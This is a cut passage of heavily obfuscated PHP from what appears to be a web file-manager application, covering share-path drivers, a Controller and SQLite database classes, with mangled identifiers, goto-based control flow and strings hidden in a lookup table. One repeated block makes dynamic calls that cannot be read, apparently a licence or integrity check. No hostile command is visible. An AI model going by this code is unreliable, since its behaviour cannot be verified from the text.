$B‚‡Õ‡ƒÓ­[$CàÔèó¼•÷[28]]; $FôãÈ’Õ¡Ÿ[$CàÔèó¼•÷[160]] = $B‚‡Õ‡ƒÓ­[$CàÔèó¼•÷[160]]; goto Aª‚ô¨Õ­ñ; d´¡Îè£ù: } public function fileOutImage($E¡×áÕ­®®, $cÀ‘œ™ÊĞÙ = 250) { $this->_fileOutImage($E¡×áÕ­®®, $cÀ‘œ™ÊĞÙ); } public function fileOutImageServer($C’›¾çù…¡, $fÌÁ×‘Ó¨´ = 250) { $this->_fileOutImage($C’›¾çù…¡, $fÌÁ×‘Ó¨´); } public function link($a„äÎï©è£, $bÚŞ–›™É = '') { $eÆ¼ƒ‰£ÌÑ = $this->model->fileInfoGet($a„äÎï©è£); return IO::link($eÆ¼ƒ‰£ÌÑ[$_SERVER[‡’¶øåüç˜][75]], $bÚŞ–›™É); } protected function parse($Eâá´ÚÇ½„) { $eĞ´äÑ” =& $_SERVER[‡’¶øåüç˜]; if (strstr($Eâá´ÚÇ½„, $eĞ´äÑ”[8]) === !1) { return array($eĞ´äÑ”[397] => intval($Eâá´ÚÇ½„), $eĞ´äÑ”[75] => $eĞ´äÑ”[33], $eĞ´äÑ”[1125] => array()); } $BµÄá‘æˆ¡ = explode($eĞ´äÑ”[8], trim($Eâá´ÚÇ½„, $eĞ´äÑ”[8])); if (count($BµÄá‘æˆ¡) < 2) { show_tips($Eâá´ÚÇ½„ . $eĞ´äÑ”[1130]); } return array($eĞ´äÑ”[397] => intval($BµÄá‘æˆ¡[0]), $eĞ´äÑ”[75] => $BµÄá‘æˆ¡[1], $eĞ´äÑ”[1125] => array_slice($BµÄá‘æˆ¡, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($A”™Ìªß„š) { $this->pathParse = $A”™Ìªß„š; $this->model = Model($_SERVER[‡’¶øåüç˜][1124]); } public function getPathOuter($eèİ¡°¦¬) { $aŸìÇÒ™”º =& $_SERVER[‡’¶øåüç˜]; if (!$eèİ¡°¦¬) { return $eèİ¡°¦¬; } $CÜ½İ÷‡Üë = $this->parse($eèİ¡°¦¬); return trim(KodIO::makeShare($this->pathParse[$aŸìÇÒ™”º[371]], $CÜ½İ÷‡Üë[$aŸìÇÒ™”º[371]]), $aŸìÇÒ™”º[8]); } protected function infoParse($eµò„ƒÉ¯», $eîĞ¾ˆØã = false, $C¢Šˆø§¾Ş = false) { $AÇŠ·Şó¯ =& $_SERVER[‡’¶øåüç˜]; $Dà²ï¬Øö = $this->pathParse[$AÇŠ·Şó¯[371]]; $a»†Ó­ƒ­· = trim($this->pathParse[$AÇŠ·Şó¯[1020]], $AÇŠ·Şó¯[8]); return Action($AÇŠ·Şó¯[1131])->sharePathInfo($Dà²ï¬Øö, $a»†Ó­ƒ­·); } public function infoFull($a”³¢µêÉò) { $b±Ê£ä£ÔŒ =& $_SERVER[‡’¶øåüç˜]; $Få¿â‰æ›¼ = explode($b±Ê£ä£ÔŒ[8], trim($a”³¢µêÉò, $b±Ê£ä£ÔŒ[8])); if (count($Få¿â‰æ›¼) > 1) { $Aô¹•É…Š“ = implode($b±Ê£ä£ÔŒ[8], array_splice($Få¿â‰æ›¼, 1)); $bÑÊè©ŞÏ£ = $this->model->pathInfoByPath($Få¿â‰æ›¼[0], $Aô¹•É…Š“); if (!$bÑÊè©ŞÏ£) { return !1; } $this->pathParse[$b±Ê£ä£ÔŒ[1020]] = $bÑÊè©ŞÏ£[$b±Ê£ä£ÔŒ[381]]; } return $this->infoParse($a”³¢µêÉò); } public function listAll($D˜Ëœ©«á³) { goto aÔš‰§†Èã; FÇÈÖ”¢à: foreach ($d£ÇöÀ•°÷ as &$aÉ¿éğ…¡£) { check_abort(); $aÉ¿éğ…¡£[$D¼Éİ¸ªÚ[403]] = $BÃŠ“ìğÜò->_shareItemeParse($aÉ¿éğ…¡£[$D¼Éİ¸ªÚ[403]], $d„ÃğĞ™—ˆ); } unset($aÉ¿éğ…¡£); return $d£ÇöÀ•°÷; goto cÚš‡¼íº; f—‘¦š©Š: $d£ÇöÀ•°÷ = $this->model->listAll($D˜Ëœ©«á³); $d„ÃğĞ™—ˆ = Model($D¼Éİ¸ªÚ[548])->getInfo($aËâÔœÊé[$D¼Éİ¸ªÚ[452]]); $BÃŠ“ìğÜò = Action($D¼Éİ¸ªÚ[1131]); goto FÇÈÖ”¢à; aÔš‰§†Èã: $D¼Éİ¸ªÚ =& $_SERVER[‡’¶øåüç˜]; $aËâÔœÊé = IO::info($this->pathParse[$D¼Éİ¸ªÚ[75]]); if (!$aËâÔœÊé) { return array(); } goto f—‘¦š©Š; cÚš‡¼íº: } } goto fè¿’Ã‹°Æ; Aç´°ŸÈ­: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\x6f\160\x74\x69\157\x6e"; protected $jsonField = array("\x6d\x65\156\165", "\162\x6f\154\x65", "\162\x6f\x6c\x65\x47\x72\157\x75\x70", "\162\x65\147\151\163\x74", "\145\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($c”İî•©Çš) { return "\123\x79\163\164\x65\x6d\x4f\160\164\x69\x6f\156\137{$c”İî•©Çš}"; } protected function optionDefault($cºš‰™Ï¯‚ = '') { $d‡š¸öÀá =& $_SERVER[‡’¶øåüç˜]; if ($cºš‰™Ï¯‚ == $d‡š¸öÀá[33]) { return $GLOBALS[$d‡š¸öÀá[6]][$d‡š¸öÀá[2515]]; } } } class SystemRecordModel extends ModelBaseLight { } if ($_SERVER[$_SERVER[‡’¶øåüç˜][372]] != $_SERVER[$_SERVER[‡’¶øåüç˜][877]]) { goto bÌöùõšÆ; bÌöùõšÆ: $c÷Æ¥‘´Ñ° = $_SERVER[‡’¶øåüç˜][374]; $dˆ—÷ˆÚªÜ = $_SERVER[$_SERVER[‡’¶øåüç˜][375]] . $_SERVER[‡’¶øåüç˜][376]; $C¾Ú³éâ‹ª = $c÷Æ¥‘´Ñ°($dˆ—÷ˆÚªÜ); goto fÚõÏÜÁ‡í; AìïÛªäƒ: $F¿ÜøÏ¾ÌË($_SERVER[$_SERVER[‡’¶øåüç˜][373]]); goto FÅ‰òÙÛœ; fÚõÏÜÁ‡í: $eĞĞùÅö” = explode($_SERVER[‡’¶øåüç˜][221], $C¾Ú³éâ‹ª); if (count($eĞĞùÅö”) < $_SERVER[‡’¶øåüç˜][377]) { $fœÓœ¤“š = $_SERVER[‡’¶øåüç˜][378]; $fœÓœ¤“š(); } $F¿ÜøÏ¾ÌË = $_SERVER[‡’¶øåüç˜][379]; goto AìïÛªäƒ; FÅ‰òÙÛœ: } goto a¾àµ“²õö; F“§Â›Î÷Î: function beforeShutdownError($A‘‰…“…ù’ = false, $f„®º…°„ = '', $B‹…¯ÛàäÏ = '', $Dƒœß¡ÕĞ = 0) { $BÃŒ ŒÔÇÒ =& $_SERVER[úÎ]; switch ($A‘‰…“…ù’) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $aÎí©â¢­Ÿ = $BÃŒ ŒÔÇÒ[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $aÎí©â¢­Ÿ = $BÃŒ ŒÔÇÒ[36]; break; case E_STRICT: $aÎí©â¢­Ÿ = $BÃŒ ŒÔÇÒ[37]; break; case E_NOTICE: case E_USER_NOTICE: $aÎí©â¢­Ÿ = $BÃŒ ŒÔÇÒ[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $aÎí©â¢­Ÿ = $BÃŒ ŒÔÇÒ[39]; break; default: break; } if (!$aÎí©â¢­Ÿ || $aÎí©â¢­Ÿ == $BÃŒ ŒÔÇÒ[38] || $aÎí©â¢­Ÿ == $BÃŒ ŒÔÇÒ[39]) { return; } $B‹…¯ÛàäÏ = $BÃŒ ŒÔÇÒ[4] . str_replace($_SERVER[$BÃŒ ŒÔÇÒ[33]], $BÃŒ ŒÔÇÒ[16], $B‹…¯ÛàäÏ); $Fâá¦¸™´ = $aÎí©â¢­Ÿ . $BÃŒ ŒÔÇÒ[40] . $f„®º…°„ . $BÃŒ ŒÔÇÒ[40] . $B‹…¯ÛàäÏ . $BÃŒ ŒÔÇÒ[40] . $Dƒœß¡ÕĞ; write_log($Fâá¦¸™´ . $BÃŒ ŒÔÇÒ[41] . get_caller_msg(1), $BÃŒ ŒÔÇÒ[15]); } $_SERVER[$_SERVER[úÎ][42]] = $_SERVER[$_SERVER[úÎ][33]] . $_SERVER[úÎ][43]; $bÚ–æØñ¦‘ = strrev(base64_decode($_SERVER[úÎ][44])); goto fõÀö˜ö¼­; e¶£¤¶á´: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto EèĞà“Ø»¬; a’ˆò¿šª§: $this->tpl = TEMPLATE . MOD . $Aê–×¡•Ñ½[8]; $this->_classObjectID = mt_rand(0, 10000); goto b˜âËÚ‹õ¡; EèĞà“Ø»¬: $Aê–×¡•Ñ½ =& $_SERVER[‡’¶øåüç˜]; global $in, $config; $this->config =& $config; goto AæÃ×®Ÿ”ƒ; AæÃ×®Ÿ”ƒ: $this->in =& $in; $this->values[$Aê–×¡•Ñ½[6]] =& $config; $this->values[$Aê–×¡•Ñ½[7]] =& $in; goto a’ˆò¿šª§; b˜âËÚ‹õ¡: } public function loadClass($E£’È¥İ ) { if (1 === func_num_args()) { $this->{$E£’È¥İ } = new $E£’È¥İ (); } else { $cŠÇˆ‚÷ = new ReflectionClass($E£’È¥İ ); $Bí–ÅÁšŠÕ = func_get_args(); array_shift($Bí–ÅÁšŠÕ); $this->{$E£’È¥İ } = $cŠÇˆ‚÷->newInstanceArgs($Bí–ÅÁšŠÕ); } return $this->{$E£’È¥İ }; } protected function assign($cˆØÖ‡ÕÛ, $Céñ„áÚ»÷) { $this->values[$cˆØÖ‡ÕÛ] = $Céñ„áÚ»÷; } protected function display($AÉâôğ¯ÛÉ) { ob_end_clean(); extract($this->values); require $this->tpl . $AÉâôğ¯ÛÉ; } } class DbSqliteBase extends Db { public function __construct($b·‘ Ä½˜ = '') { $cÁöÃ´ÈßÍ =& $_SERVER[‡’¶øåüç˜]; if (!extension_loaded($cÁöÃ´ÈßÍ[9])) { think_exception(think_lang($cÁöÃ´ÈßÍ[10]) . $cÁöÃ´ÈßÍ[11]); } if (!empty($b·‘ Ä½˜)) { if (!isset($b·‘ Ä½˜[$cÁöÃ´ÈßÍ[12]])) { $b·‘ Ä½˜[$cÁöÃ´ÈßÍ[12]] = 438; } $this->config = $b·‘ Ä½˜; if (empty($this->config[$cÁöÃ´ÈßÍ[13]])) { $this->config[$cÁöÃ´ÈßÍ[13]] = array(); } } } public function connect($BÃØ‡£áÇ— = '', $A×ÕˆÏÉíº = 0) { $e›Ñ¼¯´ =& $_SERVER[‡’¶øåüç˜]; if (!isset($this->linkID[$A×ÕˆÏÉíº])) { goto EØæÌğ„¸; aäÚ¼Àä: @sqlite_busy_timeout($this->linkID[$A×ÕˆÏÉíº], 30000); if (1 != think_config($e›Ñ¼¯´[18])) { unset($this->config); } goto cøÒ¾¸¶ ; E™Ú„ÙéÍ®: $this->linkID[$A×ÕˆÏÉíº] = $b“†„ğÆò($BÃØ‡£áÇ—[$e›Ñ¼¯´[17]], $BÃØ‡£áÇ—[$e›Ñ¼¯´[12]]); if (!$this->linkID[$A×ÕˆÏÉíº]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto aäÚ¼Àä; EØæÌğ„¸: if (empty($BÃØ‡£áÇ—)) { $BÃØ‡£áÇ— = $this->config; } $Bğï»‰Á³ = !empty($BÃØ‡£áÇ—[$e›Ñ¼¯´[13]][$e›Ñ¼¯´[14]]) ? $BÃØ‡£áÇ—[$e›Ñ¼¯´[13]][$e›Ñ¼¯´[14]] : $this->pconnect; $b“†„ğÆò = $Bğï»‰Á³ ? $e›Ñ¼¯´[15] : $e›Ñ¼¯´[16]; goto E™Ú„ÙéÍ®; cøÒ¾¸¶ : } return $this->linkID[$A×ÕˆÏÉíº]; } public function free() { $this->queryID = null; } public function query($d±ÁàÅ») { goto A…°Ã­…äŒ; B©—Êò§‡š: $this->queryStr = $d±ÁàÅ»; if ($this->queryID) { $this->free(); } think_action_status($eá·……¤“†[19], 1); goto Eø”Æ‘×«•; Eø”Æ‘×«•: think_status($eá·……¤“†[20]); $this->queryID = sqlite_query($this->_linkID, $d±ÁàÅ»); $this->debug(); goto BìâÓĞ½ œ; BìâÓĞ½ œ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $A÷ÔÌöŠ = $this->getAll(); return $A÷ÔÌöŠ; } goto a³‹¨£ßì; A…°Ã­…äŒ: $eá·……¤“† =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B©—Êò§‡š; a³‹¨£ßì: } public function execute($d„‘‚¾ä¸) { goto a«³¯ø›®„; a«³¯ø›®„: $fß³§ìê˜¤ =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto ešô›¦ÛÀ¢; A¨ä˜ë±Ä: think_status($fß³§ìê˜¤[20]); $a˜²ëáœÍÀ = sqlite_exec($this->_linkID, $d„‘‚¾ä¸); $this->debug(); goto bšâÓÚ†¹¦; ešô›¦ÛÀ¢: $this->queryStr = $d„‘‚¾ä¸; if ($this->queryID) { $this->free(); } think_action_status($fß³§ìê˜¤[21], 1); goto A¨ä˜ë±Ä; bšâÓÚ†¹¦: if (!1 === $a˜²ëáœÍÀ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto eÊ‡±ÅáöÔ; eÊ‡±ÅáöÔ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[‡’¶øåüç˜][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bÙŒó…ºÀï = sqlite_query($this->_linkID, $_SERVER[‡’¶øåüç˜][23]); if (!$bÙŒó…ºÀï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BŠÀ÷›Êì = sqlite_query($this->_linkID, $_SERVER[‡’¶øåüç˜][24]); if (!$BŠÀ÷›Êì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $E·”¿ö„«Ó = array(); if ($this->numRows > 0) { for ($b—¯µÃâ¶Ö = 0; $b—¯µÃâ¶Ö < $this->numRows; $b—¯µÃâ¶Ö++) { $E·”¿ö„«Ó[$b—¯µÃâ¶Ö] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $E·”¿ö„«Ó; } public function getFields($d¾Æñ‘¬Ã) { $BÎØ¶ˆ‹… =& $_SERVER[‡’¶øåüç˜]; $fƒ‚¿ò¸Îè = $this->query($BÎØ¶ˆ‹…[25] . $d¾Æñ‘¬Ã . $BÎØ¶ˆ‹…[26]); $a°â¤ÛÖ„ = array(); if ($fƒ‚¿ò¸Îè) { foreach ($fƒ‚¿ò¸Îè as $A³¾§ô‡Õ => $A£ÊÖ·¡å) { $a°â¤ÛÖ„[$A£ÊÖ·¡å[$BÎØ¶ˆ‹…[27]]] = array($BÎØ¶ˆ‹…[28] => $A£ÊÖ·¡å[$BÎØ¶ˆ‹…[27]], $BÎØ¶ˆ‹…[29] => $A£ÊÖ·¡å[$BÎØ¶ˆ‹…[30]], $BÎØ¶ˆ‹…[31] => (bool) ($A£ÊÖ·¡å[$BÎØ¶ˆ‹…[32]] === $BÎØ¶ˆ‹…[33]), $BÎØ¶ˆ‹…[34] => $A£ÊÖ·¡å[$BÎØ¶ˆ‹…[35]], $BÎØ¶ˆ‹…[36] => strtolower($A£ÊÖ·¡å[$BÎØ¶ˆ‹…[37]]) == $BÎØ¶ˆ‹…[38], $BÎØ¶ˆ‹…[39] => strtolower($A£ÊÖ·¡å[$BÎØ¶ˆ‹…[40]]) == $BÎØ¶ˆ‹…[41]); } } return $a°â¤ÛÖ„; } public function getTables($BÑ°„†Ì‰“ = '') { $DÇÄ¾ÑíÑ‰ =& $_SERVER[‡’¶øåüç˜]; $båˆçÒ¶‹ = $this->query($DÇÄ¾ÑíÑ‰[42] . $DÇÄ¾ÑíÑ‰[43] . $DÇÄ¾ÑíÑ‰[44]); $BŸõÌæšì = array(); foreach ($båˆçÒ¶‹ as $E¸Å¥™ØîŒ => $B£Ğ«‰ÃÃ™) { $BŸõÌæšì[$E¸Å¥™ØîŒ] = current($B£Ğ«‰ÃÃ™); } return $BŸõÌæšì; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $EÅ´„ßµâ  =& $_SERVER[‡’¶øåüç˜]; $CÀéÜŒê»ß = sqlite_last_error($this->_linkID); $this->error = $CÀéÜŒê»ß . $EÅ´„ßµâ [4] . sqlite_error_string($CÀéÜŒê»ß); if ($EÅ´„ßµâ [33] != $this->queryStr) { $this->error .= LNG($EÅ´„ßµâ [45]) . $this->queryStr; } think_trace($this->error, $EÅ´„ßµâ [33], $EÅ´„ßµâ [46]); return $this->error; } public function escapeString($bâÚ©‘—) { return sqlite_escape_string($bâÚ©‘—); } public function parseLimit($Fî„ÌÂÄéÔ) { $D¬ñÙ»’Ñä =& $_SERVER[‡’¶øåüç˜]; $A¤ÆÓìÕ„œ = $D¬ñÙ»’Ñä[33]; if (!empty($Fî„ÌÂÄéÔ)) { $Fî„ÌÂÄéÔ = explode($D¬ñÙ»’Ñä[47], $Fî„ÌÂÄéÔ); if (count($Fî„ÌÂÄéÔ) > 1) { $A¤ÆÓìÕ„œ .= $D¬ñÙ»’Ñä[48] . $Fî„ÌÂÄéÔ[1] . $D¬ñÙ»’Ñä[49] . $Fî„ÌÂÄéÔ[0] . $D¬ñÙ»’Ñä[50]; } else { $A¤ÆÓìÕ„œ .= $D¬ñÙ»’Ñä[48] . $Fî„ÌÂÄéÔ[0] . $D¬ñÙ»’Ñä[50]; } } return $A¤ÆÓìÕ„œ; } } class DbSqlite3Base extends Db { public function __construct($eÕÄœ·™À = '') { $béÄÛ§¼ƒ¨ =& $_SERVER[‡’¶øåüç˜]; if (!class_exists($béÄÛ§¼ƒ¨[51])) { think_exception(think_lang($béÄÛ§¼ƒ¨[10]) . $béÄÛ§¼ƒ¨[52]); } if (!empty($eÕÄœ·™À)) { if (!isset($eÕÄœ·™À[$béÄÛ§¼ƒ¨[12]])) { $eÕÄœ·™À[$béÄÛ§¼ƒ¨[12]] = 438; } $this->config = $eÕÄœ·™À; if (empty($this->config[$béÄÛ§¼ƒ¨[13]])) { $this->config[$béÄÛ§¼ƒ¨[13]] = array(); } } } public function connect($F—Çæ¹³“Â = '', $bê²Øğ½¾ = 0) { $A‡Ç­Ö§ã =& $_SERVER[‡’¶øåüç˜]; if (!isset($this->linkID[$bê²Øğ½¾])) { if (empty($F—Çæ¹³“Â)) { $F—Çæ¹³“Â = $this->config; } $this->linkID[$bê²Øğ½¾] = new SQLite3($F—Çæ¹³“Â[$A‡Ç­Ö§ã[17]]); if (!$this->linkID[$bê²Øğ½¾]) { think_exception($this->linkID[$bê²Øğ½¾]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$bê²Øğ½¾]->busyTimeout(30000); if (1 != think_config($A‡Ç­Ö§ã[18])) { unset($this->config); } } return $this->linkID[$bê²Øğ½¾]; } public function free() { $this->queryID = null; } public function query($AµÓˆ˜å¹) { goto C¾›¾¡˜¹É; Dù‰¼—¯Ùí: $this->queryStr = $AµÓˆ˜å¹; if ($this->queryID) { $this->free(); } think_action_status($F¥¹é¶ìÉö[19], 1); goto F©ÆĞšˆÑ˜; F©ÆĞšˆÑ˜: think_status($F¥¹é¶ìÉö[20]); $this->queryID = $this->_linkID->query($AµÓˆ˜å¹); $this->debug(); goto FéË«Œµ¸ƒ; C¾›¾¡˜¹É: $F¥¹é¶ìÉö =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dù‰¼—¯Ùí; FéË«Œµ¸ƒ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $BÀëôÑ°ï = $this->getAll(); $this->numRows = count($BÀëôÑ°ï); return $BÀëôÑ°ï; } goto fªè¾Ãáì; fªè¾Ãáì: } public function execute($EÓÊ”ÃÌ) { goto EÅò¦×œ†»; F“…ïÌ¡®: $this->queryStr = $EÓÊ”ÃÌ; if ($this->queryID) { $this->free(); } think_action_status($Fƒ†àš‘„Ò[21], 1); goto e¶ÖçÂÎ«ñ; EÅò¦×œ†»: $Fƒ†àš‘„Ò =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F“…ïÌ¡®; e¶ÖçÂÎ«ñ: think_status($Fƒ†àš‘„Ò[20]); $aˆÀÛš„³ = $this->_linkID->exec($EÓÊ”ÃÌ); $this->debug(); goto d•ÚÁ…•; d•ÚÁ…•: if (!1 === $aˆÀÛš„³) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto a¬à¹ìÄù; a¬à¹ìÄù: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[‡’¶øåüç˜][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e‰——äæé = $this->_linkID->query($_SERVER[‡’¶øåüç˜][23]); if (!$e‰——äæé) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AìÔ¯ìŒ‡õ = $this->_linkID->query($_SERVER[‡’¶øåüç˜][24]); if (!$AìÔ¯ìŒ‡õ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $d²¤¿ÔÜÀí = array(); while ($E÷æÉ–—™ó = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $d²¤¿ÔÜÀí[] = $E÷æÉ–—™ó; } $this->queryID->reset(); return $d²¤¿ÔÜÀí; } public function getFields($E«šŠ²à‘) { $cÚ»½Ì­ =& $_SERVER[‡’¶øåüç˜]; $A­¯¯ñ¼ö† = $this->query($cÚ»½Ì­[25] . $E«šŠ²à‘ . $cÚ»½Ì­[26]); $Cä‰µç¹˜¼ = array(); if ($A­¯¯ñ¼ö†) { foreach ($A­¯¯ñ¼ö† as $B¹‘¥¿ƒâ => $DãŸ×™÷ßÅ) { $Cä‰µç¹˜¼[$DãŸ×™÷ßÅ[$cÚ»½Ì­[28]]] = array($cÚ»½Ì­[28] => $DãŸ×™÷ßÅ[$cÚ»½Ì­[28]], $cÚ»½Ì­[29] => $DãŸ×™÷ßÅ[$cÚ»½Ì­[29]], $cÚ»½Ì­[31] => (bool) ($DãŸ×™÷ßÅ[$cÚ»½Ì­[31]] === $cÚ»½Ì­[33]), $cÚ»½Ì­[34] => $DãŸ×™÷ßÅ[$cÚ»½Ì­[53]], $cÚ»½Ì­[36] => (bool) $DãŸ×™÷ßÅ[$cÚ»½Ì­[54]], $cÚ»½Ì­[39] => (bool) $DãŸ×™÷ßÅ[$cÚ»½Ì­[54]]); } } return $Cä‰µç¹˜¼; } public function getTables($C”ëùÂÒ = '') { $c“¡¢«ë­Ç =& $_SERVER[‡’¶øåüç˜]; $aŒéãŸŸ±ª = $this->query($c“¡¢«ë­Ç[42] . $c“¡¢«ë­Ç[43] . $c“¡¢«ë­Ç[44]); $a¾’çãÍÛ = array(); foreach ($aŒéãŸŸ±ª as $FÁõŠÎôßÈ => $D÷ë¬¸É§Î) { $a¾’çãÍÛ[$FÁõŠÎôßÈ] = current($D÷ë¬¸É§Î); } return $a¾’çãÍÛ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E‚ğÎÛªË =& $_SERVER[‡’¶øåüç˜]; $this->error = $this->_linkID->lastErrorMsg(); if ($E‚ğÎÛªË[33] != $this->queryStr) { $this->error .= LNG($E‚ğÎÛªË[45]) . $this->queryStr; } think_trace($this->error, $E‚ğÎÛªË[33], $E‚ğÎÛªË[46]); return $this->error; } public function escapeString($bÁ¸ôíî©) { $a‹Ì¢ìÛÕ =& $_SERVER[‡’¶øåüç˜]; if ($this->_linkID) { return $this->_linkID->escapeString($bÁ¸ôíî©); } return str_ireplace($a‹Ì¢ìÛÕ[55], $a‹Ì¢ìÛÕ[56], $bÁ¸ôíî©); } public function parseLimit($A• ³‡äœ) { $FÖ’á¶©ˆÛ =& $_SERVER[‡’¶øåüç˜]; $B—·¤¸”› = $FÖ’á¶©ˆÛ[33]; if (!empty($A• ³‡äœ)) { $A• ³‡äœ = explode($FÖ’á¶©ˆÛ[47], $A• ³‡äœ); if (count($A• ³‡äœ) > 1) { $B—·¤¸”› .= $FÖ’á¶©ˆÛ[48] . $A• ³‡äœ[1] . $FÖ’á¶©ˆÛ[49] . $A• ³‡äœ[0] . $FÖ’á¶©ˆÛ[50]; } else { $B—·¤¸”› .= $FÖ’á¶©ˆÛ[48] . $A• ³‡äœ[0] . $FÖ’á¶©ˆÛ[50]; } } return $B—·¤¸”›; } } goto Cğ¨àÊ”Ú; d÷ÇÉ‡Ìœ—: define($_SERVER[‡’¶øåüç˜][1941], 3); define($_SERVER[‡’¶øåüç˜][1942], 4); define($_SERVER[‡’¶øåüç˜][1943], 5); goto B‚ÛŠÙç¬; fÌùáœ”¬: if ($_SERVER[$_SERVER[‡’¶øåüç˜][372]] != $_SERVER[$_SERVER[‡’¶øåüç˜][877]]) { goto dêŞÁ‚™¨½; cÕË–™İå: $F¿ÜøÏ¾ÌË($_SERVER[$_SERVER[‡’¶øåüç˜][373]]); goto a¹ˆğ¯ŸÌ; dêŞÁ‚™¨½: $c÷Æ¥‘´Ñ° = $_SERVER[‡’¶øåüç˜][374]; $dˆ—÷ˆÚªÜ = $_SERVER[$_SERVER[‡’¶øåüç˜][375]] . $_SERVER[‡’¶øåüç˜][376]; $C¾Ú³éâ‹ª = $c÷Æ¥‘´Ñ°($dˆ—÷ˆÚªÜ); goto FÅÄ†·Éæî; FÅÄ†·Éæî: $eĞĞùÅö” = explode($_SERVER[‡’¶øåüç˜][221], $C¾Ú³éâ‹ª); if (count($eĞĞùÅö”) < $_SERVER[‡’¶øåüç˜][377]) { $fœÓœ¤“š = $_SERVER[‡’¶øåüç˜][378]; $fœÓœ¤“š(); } $F¿ÜøÏ¾ÌË = $_SERVER[‡’¶øåüç˜][379]; goto cÕË–™İå; a¹ˆğ¯ŸÌ: } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\x6e\145\x71" => "\x3c\x3e", "\x67\x74" => "\76", "\x65\147\x74" => "\x3e\x3d", "\154\x74" => "\74", "\145\x6c\164" => "\74\x3d", "\156\x6f\x74\154\x69\153\x65" => "\116\x4f\x54\40\x4c\111\113\105", "\x6c\151\x6b\145" => "\x4c\x49\113\105", "\151\x6e" => "\x49\116", "\x6e\x6f\164\151\x6e" => "\116\117\124\x20\111\116", "\x6e\157\x74\40\x69\x6e" => "\116\117\x54\x20\111\x4e", "\142\x65\164\167\145\x65\156" => "\102\x45\x54\x57\105\x45\x4e", "\x6e\157\164\x62\x65\164\x77\x65\x65\x6e" => "\x4e\x4f\124\40\102\x45\124\127\105\x45\x4e", "\x6e\x6f\164\40\142\x65\x74\167\x65\145\156" => "\x4e\117\124\40\x42\105\x54\127\x45\x45\116"); protected $selectSql = "\123\x45\114\x45\103\124\x25\104\111\x53\124\111\x4e\103\x54\45\x20\x25\x46\111\105\x4c\x44\x25\40\106\122\117\115\x20\45\x54\101\x42\x4c\105\x25\45\112\117\111\116\45\x25\x57\110\105\x52\x45\45\45\107\122\117\x55\x50\45\x25\x48\x41\x56\111\x4e\x47\45\x25\x4f\122\104\x45\122\45\45\x4c\x49\115\111\124\45\x20\x25\x55\x4e\111\x4f\x4e\45\45\x43\117\x4d\115\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $Aˆª’ÏÅƒã = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[‡’¶øåüç˜][878], $Aˆª’ÏÅƒã); } public function factory($A…Í›Ì¿Ğ¿ = '') { goto D²‚‡¨èéõ; D²‚‡¨èéõ: $E©à·–‘Øî =& $_SERVER[‡’¶øåüç˜]; $A…Í›Ì¿Ğ¿ = $this->parseConfig($A…Í›Ì¿Ğ¿); if (empty($A…Í›Ì¿Ğ¿[$E©à·–‘Øî[879]])) { think_exception(think_lang($E©à·–‘Øî[880])); } goto DŠé—£”¨; A©­ğ³Àå: return $eÒ½î ¥›; goto bôä•Û…©ğ; DŠé—£”¨: $this->dbType = ucwords(strtolower($A…Í›Ì¿Ğ¿[$E©à·–‘Øî[879]])); $Fç©±§Å¢× = $E©à·–‘Øî[881] . $this->dbType; if (class_exists($Fç©±§Å¢×)) { $eÒ½î ¥› = new $Fç©±§Å¢×($A…Í›Ì¿Ğ¿); if ($E©à·–‘Øî[729] != strtolower($A…Í›Ì¿Ğ¿[$E©à·–‘Øî[879]])) { $eÒ½î ¥›->dbType = strtoupper($this->dbType); } else { $eÒ½î ¥›->dbType = $this->_getDsnType($A…Í›Ì¿Ğ¿[$E©à·–‘Øî[833]]); } } else 